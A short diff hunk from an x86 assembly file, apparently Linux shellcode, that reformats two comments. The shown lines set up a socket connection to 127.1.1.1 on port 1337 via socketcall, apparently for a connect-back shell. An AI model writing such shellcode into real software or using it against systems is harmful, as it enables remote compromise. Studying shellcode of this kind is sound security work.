@@ -25,8 +25,8 @@ mov ecx,esp
 int 0x80
 xchg edx, eax
 mov al, 0x66
-push 0x101017f ;ip 127.1.1.1
-pushw 0x3905 ;port 1337
+push 0x101017f  ; ip 127.1.1.1
+pushw 0x3905  ; port 1337
 inc ebx
 push bx
 mov ecx, esp
